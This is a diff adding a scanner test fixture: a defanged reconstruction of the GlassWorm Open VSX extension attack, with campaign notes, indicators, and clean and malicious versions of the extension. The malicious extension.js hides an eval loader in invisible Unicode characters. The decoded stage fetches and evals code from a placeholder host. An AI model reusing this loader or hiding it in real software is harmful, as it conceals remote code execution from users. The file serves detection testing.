@@ -1,0 +1,294 @@
+# Defanged reconstruction of a real malicious extension, for scanner tests.
+# Never install or run. See internal/e2e/livescan/corpus.go.
+id: glassworm-codejoy-1.8.3
+title: "codejoy.codejoy-vscode-extension 1.8.3 (Open VSX): GlassWorm loader hidden in invisible Unicode characters"
+campaign: glassworm-2025
+date: "2025-10-17"
+kind: vsix
+ecosystem: openvsx
+name: codejoy.codejoy-vscode-extension
+version: "1.8.3"
+benignVersion: "1.8.2"
+summary: >-
+  GlassWorm, named by Koi Security, was first seen on Open VSX on 2025-10-17:
+  new versions of a handful of extensions were published from their real
+  publishers' accounts (Eclipse says through publish tokens leaked in public
+  repositories, which Wiz had reported; Koi says compromised developer
+  accounts). Koi's risk engine flagged codejoy.codejoy-vscode-extension first:
+  1.8.3 and 1.8.4 were the malicious CodeJoy releases, between the clean 1.8.2
+  (2025-10-16) and 1.8.5 (2025-10-20). The JavaScript carried its loader as a
+  run of thousands of invisible characters inside what looks like an empty
+  template literal: Unicode variation selectors (U+FE00-FE0F and U+E0100-E01EF,
+  256 values, one per byte; Endor Labs counted 6,492 in the sample it decoded)
+  that a short function mapped back to bytes and passed to eval. The decoded
+  stage polled the Solana blockchain for the newest transaction memo of a
+  hard-coded wallet; the memo's JSON held a base64 link to the next stage on a
+  plain IP address (a Google Calendar event title was a backup), which came back
+  AES-encrypted with its key and IV in the HTTP response headers. That stage
+  stole npm, GitHub, Open VSX and Git credentials, went for cryptocurrency
+  wallet extensions (49 per Koi, more than 70 per Endor) and, Koi says, used the
+  stolen tokens to publish further extensions; a last module added a SOCKS
+  proxy, hidden VNC and peer-to-peer control channels. Koi's analysis began on
+  2025-10-18; Open VSX removed the extensions, revoked or rotated the tokens and
+  called the incident contained on 2025-10-21. Reports differ: Koi counted about
+  35,800 downloads and called GlassWorm a self-propagating worm, while Eclipse
+  says bots inflated the downloads and that nothing spread by itself beyond the
+  stolen credentials.
+techniques: [publisher-compromise, invisible-unicode, eval-loader, blockchain-c2, credential-theft, remote-access]
+reconstruction: >-
+  extension.js carries the loader as Aikido and OpenSourceMalware quote it for
+  the later npm, GitHub and Open VSX waves, with the mapping Koi and Endor
+  describe for the first one: a short function turns each variation selector
+  back into a byte (U+FE00-FE0F to 0-15, U+E0100-E01EF to 16-255, anything else
+  dropped) and the bytes, read as UTF-8, go to eval, from a template literal
+  that shows as empty. The run is 1,163 characters, not the 6,492 Endor counted,
+  because it decodes to a short stage that can do nothing: it keeps the call
+  shape Koi shows (getSignaturesForAddress(WALLET, { limit: 1000 }), the memo
+  filter and regular expression, atob on the memo's base64 link) but answers
+  from a table inside the script, with a wallet string that is not a valid
+  address, so the only address it builds is under next.invalid, which fetch can
+  never reach. Dropped: the RPC lookup, the AES step with key and IV from the
+  response headers, the calendar fallback, the stealer and the remote-access
+  module. Endor reports that the first-wave run decodes to Base64 text that is
+  decoded again before eval; here it decodes straight to the script. The
+  activation cooldown and the OS-specific native decoders Endor describes are
+  not reproduced. The rest of the extension (a status bar item and two commands)
+  is a small stand-in; its manifest fields (main, activationEvents,
+  engines.vscode, the two commands) follow the real clean 1.8.2. The generic
+  corpus checks cannot see inside the run, so
+  internal/e2e/livescan/corpus_glassworm_test.go decodes it and holds it to the
+  same rules.
+references:
+  - https://www.paloaltonetworks.com/blog/security-operations/glassworm-first-self-propagating-worm-using-invisible-code-hits-openvsx-marketplace/
+  - https://www.endorlabs.com/learn/invisible-threats-glassworm-unicode-vscode
+  - https://blogs.eclipse.org/post/mika%C3%ABl-barbero/open-vsx-security-update-october-2025
+  - https://www.truesec.com/hub/blog/glassworm-self-propagating-vscode-extension
+  - https://thehackernews.com/2025/10/self-spreading-glassworm-infects-vs.html
+  - https://www.aikido.dev/blog/glassworm-returns-unicode-attack-github-npm-vscode
+  - https://opensourcemalware.com/blog/glassworm-invades-github-npm-open-vsx-and-vs-code
+  - https://fluidattacks.com/blog/glassworm-vs-code-extensions-supply-chain-attack
+legitimateHosts:
+  - github.com
+indicators:
+  - "w >= 0xFE00 && w <= 0xFE0F"
+  - "w >= 0xE0100 && w <= 0xE01EF"
+  - "eval(Buffer.from(s("
+extension:
+  publisher: codejoy
+  name: codejoy-vscode-extension
+-- shared/readme.md --
+# CodeJoy
+
+Project management, deployment and workflow tools for VS Code.
+
+## Features
+
+- **Open Project Workflow** shows the steps of the workflow defined in
+  `.codejoy/workflow.json`; without that file the steps are build, package and
+  deploy.
+- A status bar item shows the current workflow. Click it to open the workflow.
+-- shared/workflow.js --
+'use strict';
+
+const fs = require('fs');
+const path = require('path');
+
+const DEFAULT_STEPS = ['build', 'package', 'deploy'];
+
+// A project's workflow is the list of steps in .codejoy/workflow.json; a folder
+// without one (or with one that is not valid) gets the default steps.
+function loadWorkflow(folder) {
+  const file = path.join(folder, '.codejoy', 'workflow.json');
+  try {
+    const data = JSON.parse(fs.readFileSync(file, 'utf8'));
+    if (Array.isArray(data.steps) && data.steps.every((step) => typeof step === 'string')) {
+      return { name: data.name || path.basename(folder), steps: data.steps };
+    }
+  } catch (err) {
+    // fall through to the default
+  }
+  return { name: path.basename(folder), steps: DEFAULT_STEPS };
+}
+
+function describeWorkflow(workflow) {
+  return workflow.name + ': ' + workflow.steps.join(' > ');
+}
+
+module.exports = { loadWorkflow, describeWorkflow };
+-- benign/package.json --
+{
+  "name": "codejoy-vscode-extension",
+  "displayName": "CodeJoy",
+  "version": "1.8.2",
+  "publisher": "codejoy",
+  "description": "CodeJoy VS Code extension: project management, deployment and workflow tools",
+  "license": "MIT",
+  "repository": {
+    "type": "git",
+    "url": "https://github.com/codejoy/codejoy-vscode-extension.git"
+  },
+  "bugs": {
+    "url": "https://github.com/codejoy/codejoy-vscode-extension/issues"
+  },
+  "engines": {
+    "vscode": ">=1.77.0"
+  },
+  "categories": ["Other"],
+  "main": "./extension.js",
+  "activationEvents": ["onStartupFinished"],
+  "contributes": {
+    "configuration": {
+      "title": "CodeJoy",
+      "properties": {}
+    },
+    "commands": [
+      {
+        "command": "codejoy.openProjectWorkflow",
+        "title": "Open Project Workflow",
+        "category": "CodeJoy"
+      },
+      {
+        "command": "codejoy.projectWorkflow.focus",
+        "title": "Focus Project Workflow",
+        "category": "CodeJoy"
+      }
+    ]
+  }
+}
+-- benign/extension.js --
+'use strict';
+
+const vscode = require('vscode');
+const { loadWorkflow, describeWorkflow } = require('./workflow');
+
+function currentFolder() {
+  const folders = vscode.workspace.workspaceFolders;
+  return folders && folders.length > 0 ? folders[0].uri.fsPath : null;
+}
+
+function activate(context) {
+  const status = vscode.window.createStatusBarItem(vscode.StatusBarAlignment.Left, 50);
+  status.command = 'codejoy.openProjectWorkflow';
+  context.subscriptions.push(status);
+
+  const refresh = () => {
+    const folder = currentFolder();
+    if (!folder) {
+      status.hide();
+      return;
+    }
+    status.text = '$(rocket) ' + describeWorkflow(loadWorkflow(folder));
+    status.show();
+  };
+
+  context.subscriptions.push(
+    vscode.commands.registerCommand('codejoy.openProjectWorkflow', () => {
+      const folder = currentFolder();
+      if (!folder) {
+        vscode.window.showInformationMessage('Open a folder to see its CodeJoy workflow.');
+        return;
+      }
+      vscode.window.showInformationMessage(describeWorkflow(loadWorkflow(folder)));
+    }),
+    vscode.commands.registerCommand('codejoy.projectWorkflow.focus', refresh),
+    vscode.workspace.onDidChangeWorkspaceFolders(refresh)
+  );
+
+  refresh();
+}
+
+function deactivate() {}
+
+module.exports = { activate, deactivate };
+-- malicious/package.json --
+{
+  "name": "codejoy-vscode-extension",
+  "displayName": "CodeJoy",
+  "version": "1.8.3",
+  "publisher": "codejoy",
+  "description": "CodeJoy VS Code extension: project management, deployment and workflow tools",
+  "license": "MIT",
+  "repository": {
+    "type": "git",
+    "url": "https://github.com/codejoy/codejoy-vscode-extension.git"
+  },
+  "bugs": {
+    "url": "https://github.com/codejoy/codejoy-vscode-extension/issues"
+  },
+  "engines": {
+    "vscode": ">=1.77.0"
+  },
+  "categories": ["Other"],
+  "main": "./extension.js",
+  "activationEvents": ["onStartupFinished"],
+  "contributes": {
+    "configuration": {
+      "title": "CodeJoy",
+      "properties": {}
+    },
+    "commands": [
+      {
+        "command": "codejoy.openProjectWorkflow",
+        "title": "Open Project Workflow",
+        "category": "CodeJoy"
+      },
+      {
+        "command": "codejoy.projectWorkflow.focus",
+        "title": "Focus Project Workflow",
+        "category": "CodeJoy"
+      }
+    ]
+  }
+}
+-- malicious/extension.js --
+'use strict';
+
+const vscode = require('vscode');
+const { loadWorkflow, describeWorkflow } = require('./workflow');
+
+const s = v => [...v].map(w => (
+  w = w.codePointAt(0),
+  w >= 0xFE00 && w <= 0xFE0F ? w - 0xFE00 :
+  w >= 0xE0100 && w <= 0xE01EF ? w - 0xE0100 + 16 : null
+)).filter(n => n !== null);
+eval(Buffer.from(s(`󠄘󠅑󠅣󠅩󠅞󠅓󠄐󠄘󠄙󠄐󠄭󠄮󠄐󠅫︊󠄐󠄐󠅓󠅟󠅞󠅣󠅤󠄐󠅇󠄱󠄼󠄼󠄵󠅄󠄐󠄭󠄐󠄗󠄿󠄠󠄿󠄠󠄿󠄠󠄿󠄠󠄿󠄠󠄿󠄠󠄿󠄠󠄿󠄠󠄿󠄠󠄿󠄠󠄿󠄠󠄿󠄠󠄿󠄠󠄿󠄠󠄿󠄠󠄿󠄠󠄿󠄠󠄿󠄠󠄿󠄠󠄿󠄠󠄿󠄠󠄿󠄠󠄗󠄫︊︊󠄐󠄐󠄟󠄟󠄐󠅞󠅕󠅧󠅕󠅣󠅤󠄐󠅤󠅢󠅑󠅞󠅣󠅑󠅓󠅤󠅙󠅟󠅞󠅣󠄐󠅠󠅕󠅢󠄐󠅧󠅑󠅜󠅜󠅕󠅤󠄫󠄐󠅑󠄐󠅝󠅕󠅝󠅟󠄐󠅢󠅕󠅑󠅔󠅣󠄐󠄒󠅋󠄬󠅜󠅕󠅞󠅗󠅤󠅘󠄮󠅍󠄐󠄬󠅤󠅕󠅨󠅤󠄮󠄒󠄐󠅑󠅞󠅔󠄐󠅤󠅘󠅕󠄐󠅤󠅕󠅨󠅤󠄐󠅙󠅣󠄐󠄺󠅃󠄿󠄾︊󠄐󠄐󠅓󠅟󠅞󠅣󠅤󠄐󠅜󠅕󠅔󠅗󠅕󠅢󠄐󠄭󠄐󠅫︊󠄐󠄐󠄐󠄐󠅋󠅇󠄱󠄼󠄼󠄵󠅄󠅍󠄪󠄐󠅋︊󠄐󠄐󠄐󠄐󠄐󠄐󠅫󠄐󠅣󠅙󠅗󠅞󠅑󠅤󠅥󠅢󠅕󠄪󠄐󠄗󠅑󠄡󠅑󠄡󠅑󠄡󠅑󠄡󠅑󠄡󠅑󠄡󠅑󠄡󠅑󠄡󠄗󠄜󠄐󠅣󠅜󠅟󠅤󠄪󠄐󠄡󠄜󠄐󠅝󠅕󠅝󠅟󠄪󠄐󠅞󠅥󠅜󠅜󠄐󠅭󠄜︊󠄐󠄐󠄐󠄐󠄐󠄐󠅫󠄐󠅣󠅙󠅗󠅞󠅑󠅤󠅥󠅢󠅕󠄪󠄐󠄗󠅒󠄢󠅒󠄢󠅒󠄢󠅒󠄢󠅒󠄢󠅒󠄢󠅒󠄢󠅒󠄢󠄗󠄜󠄐󠅣󠅜󠅟󠅤󠄪󠄐󠄢󠄜󠄐󠅝󠅕󠅝󠅟󠄪󠄐󠄗󠅋󠄤󠄧󠅍󠄐󠅫󠄒󠅜󠅙󠅞󠅛󠄒󠄪󠄒󠅑󠄸󠅂󠄠󠅓󠄴󠅟󠅦󠄼󠄢󠄥󠅜󠅕󠄸󠅁󠅥󠅑󠅇󠄥󠄢󠅉󠅇󠅨󠅠󠅊󠄳󠄩󠅪󠅔󠄷󠄶󠅞󠅊󠅄󠄹󠄭󠄒󠅭󠄗󠄐󠅭󠄜︊󠄐󠄐󠄐󠄐󠅍󠄜︊󠄐󠄐󠅭󠄫︊︊󠄐󠄐󠅑󠅣󠅩󠅞󠅓󠄐󠅖󠅥󠅞󠅓󠅤󠅙󠅟󠅞󠄐󠅗󠅕󠅤󠅃󠅙󠅗󠅞󠅑󠅤󠅥󠅢󠅕󠅣󠄶󠅟󠅢󠄱󠅔󠅔󠅢󠅕󠅣󠅣󠄘󠅑󠅔󠅔󠅢󠅕󠅣󠅣󠄜󠄐󠅟󠅠󠅤󠅙󠅟󠅞󠅣󠄙󠄐󠅫︊󠄐󠄐󠄐󠄐󠅢󠅕󠅤󠅥󠅢󠅞󠄐󠄘󠅜󠅕󠅔󠅗󠅕󠅢󠅋󠅑󠅔󠅔󠅢󠅕󠅣󠅣󠅍󠄐󠅬󠅬󠄐󠅋󠅍󠄙󠄞󠅣󠅜󠅙󠅓󠅕󠄘󠄠󠄜󠄐󠅟󠅠󠅤󠅙󠅟󠅞󠅣󠄞󠅜󠅙󠅝󠅙󠅤󠄙󠄫︊󠄐󠄐󠅭︊︊󠄐󠄐󠄟󠄟󠄐󠅤󠅘󠅕󠄐󠅖󠅙󠅢󠅣󠅤󠄐󠅕󠅞󠅤󠅢󠅩󠄐󠅤󠅘󠅑󠅤󠄐󠅓󠅑󠅢󠅢󠅙󠅕󠅣󠄐󠅑󠄐󠅝󠅕󠅝󠅟󠄐󠅞󠅑󠅝󠅕󠅣󠄐󠅤󠅘󠅕󠄐󠅞󠅕󠅨󠅤󠄐󠅣󠅤󠅑󠅗󠅕︊󠄐󠄐󠅑󠅣󠅩󠅞󠅓󠄐󠅖󠅥󠅞󠅓󠅤󠅙󠅟󠅞󠄐󠅞󠅕󠅨󠅤󠅃󠅤󠅑󠅗󠅕󠅅󠅢󠅜󠄘󠄙󠄐󠅫︊󠄐󠄐󠄐󠄐󠅓󠅟󠅞󠅣󠅤󠄐󠅣󠅙󠅗󠅞󠅑󠅤󠅥󠅢󠅕󠅣󠄐󠄭󠄐󠅑󠅧󠅑󠅙󠅤󠄐󠅗󠅕󠅤󠅃󠅙󠅗󠅞󠅑󠅤󠅥󠅢󠅕󠅣󠄶󠅟󠅢󠄱󠅔󠅔󠅢󠅕󠅣󠅣󠄘󠅇󠄱󠄼󠄼󠄵󠅄󠄜󠄐󠅫󠄐󠅜󠅙󠅝󠅙󠅤󠄪󠄐󠄡󠄠󠄠󠄠󠄐󠅭󠄙󠄫︊󠄐󠄐󠄐󠄐󠅓󠅟󠅞󠅣󠅤󠄐󠅝󠅕󠅝󠅟󠄐󠄭󠄐󠅣󠅙󠅗󠅞󠅑󠅤󠅥󠅢󠅕󠅣󠄞󠅖󠅙󠅜󠅤󠅕󠅢󠄘󠄘󠅨󠄙󠄐󠄭󠄮󠄐󠅨󠄐󠄖󠄖󠄐󠅨󠄞󠅝󠅕󠅝󠅟󠄙󠅋󠄠󠅍󠄞󠅝󠅕󠅝󠅟󠄫︊󠄐󠄐󠄐󠄐󠅓󠅟󠅞󠅣󠅤󠄐󠅓󠄢󠄴󠅑󠅤󠅑󠄐󠄭󠄐󠄺󠅃󠄿󠄾󠄞󠅠󠅑󠅢󠅣󠅕󠄘󠅝󠅕󠅝󠅟󠄞󠅢󠅕󠅠󠅜󠅑󠅓󠅕󠄘󠄟󠅌󠅋󠅌󠅔󠄛󠅌󠅍󠅌󠅣󠄚󠄟󠄜󠄐󠄗󠄗󠄙󠄙󠄫︊󠄐󠄐󠄐󠄐󠅢󠅕󠅤󠅥󠅢󠅞󠄐󠅑󠅤󠅟󠅒󠄘󠅓󠄢󠄴󠅑󠅤󠅑󠄞󠅜󠅙󠅞󠅛󠄙󠄫︊󠄐󠄐󠅭︊︊󠄐󠄐󠄟󠄟󠄐󠅜󠅟󠅟󠅛󠄐󠅑󠅗󠅑󠅙󠅞󠄐󠅑󠄐󠅖󠅕󠅧󠄐󠅤󠅙󠅝󠅕󠅣󠄜󠄐󠅤󠅕󠅞󠄐󠅣󠅕󠅓󠅟󠅞󠅔󠅣󠄐󠅑󠅠󠅑󠅢󠅤︊󠄐󠄐󠅖󠅟󠅢󠄐󠄘󠅜󠅕󠅤󠄐󠅑󠅤󠅤󠅕󠅝󠅠󠅤󠄐󠄭󠄐󠄠󠄫󠄐󠅑󠅤󠅤󠅕󠅝󠅠󠅤󠄐󠄬󠄐󠄣󠄫󠄐󠅑󠅤󠅤󠅕󠅝󠅠󠅤󠄛󠄛󠄙󠄐󠅫︊󠄐󠄐󠄐󠄐󠅤󠅢󠅩󠄐󠅫︊󠄐󠄐󠄐󠄐󠄐󠄐󠅓󠅟󠅞󠅣󠅤󠄐󠅢󠅕󠅣󠄐󠄭󠄐󠅑󠅧󠅑󠅙󠅤󠄐󠅖󠅕󠅤󠅓󠅘󠄘󠅑󠅧󠅑󠅙󠅤󠄐󠅞󠅕󠅨󠅤󠅃󠅤󠅑󠅗󠅕󠅅󠅢󠅜󠄘󠄙󠄙󠄫︊󠄐󠄐󠄐󠄐󠄐󠄐󠅕󠅦󠅑󠅜󠄘󠅑󠅧󠅑󠅙󠅤󠄐󠅢󠅕󠅣󠄞󠅤󠅕󠅨󠅤󠄘󠄙󠄙󠄫︊󠄐󠄐󠄐󠄐󠄐󠄐󠅢󠅕󠅤󠅥󠅢󠅞󠄫︊󠄐󠄐󠄐󠄐󠅭󠄐󠅓󠅑󠅤󠅓󠅘󠄐󠄘󠅕󠅢󠅢󠄙󠄐󠅫︊󠄐󠄐󠄐󠄐󠄐󠄐󠅑󠅧󠅑󠅙󠅤󠄐󠅞󠅕󠅧󠄐󠅀󠅢󠅟󠅝󠅙󠅣󠅕󠄘󠄘󠅢󠅕󠅣󠅟󠅜󠅦󠅕󠄙󠄐󠄭󠄮󠄐󠅣󠅕󠅤󠅄󠅙󠅝󠅕󠅟󠅥󠅤󠄘󠅢󠅕󠅣󠅟󠅜󠅦󠅕󠄜󠄐󠄡󠄠󠄠󠄠󠄠󠄙󠄙󠄫︊󠄐󠄐󠄐󠄐󠅭︊󠄐󠄐󠅭︊󠅭󠄙󠄘󠄙󠄫︊`)).toString('utf-8'));
+
+function currentFolder() {
+  const folders = vscode.workspace.workspaceFolders;
+  return folders && folders.length > 0 ? folders[0].uri.fsPath : null;
+}
+
+function activate(context) {
+  const status = vscode.window.createStatusBarItem(vscode.StatusBarAlignment.Left, 50);
+  status.command = 'codejoy.openProjectWorkflow';
+  context.subscriptions.push(status);
+
+  const refresh = () => {
+    const folder = currentFolder();
+    if (!folder) {
+      status.hide();
+      return;
+    }
+    status.text = '$(rocket) ' + describeWorkflow(loadWorkflow(folder));
+    status.show();
+  };
+
+  context.subscriptions.push(
+    vscode.commands.registerCommand('codejoy.openProjectWorkflow', () => {
+      const folder = currentFolder();
+      if (!folder) {
+        vscode.window.showInformationMessage('Open a folder to see its CodeJoy workflow.');
+        return;
+      }
+      vscode.window.showInformationMessage(describeWorkflow(loadWorkflow(folder)));
+    }),
+    vscode.commands.registerCommand('codejoy.projectWorkflow.focus', refresh),
+    vscode.workspace.onDidChangeWorkspaceFolders(refresh)
+  );
+
+  refresh();
+}
+
+function deactivate() {}
+
+module.exports = { activate, deactivate };
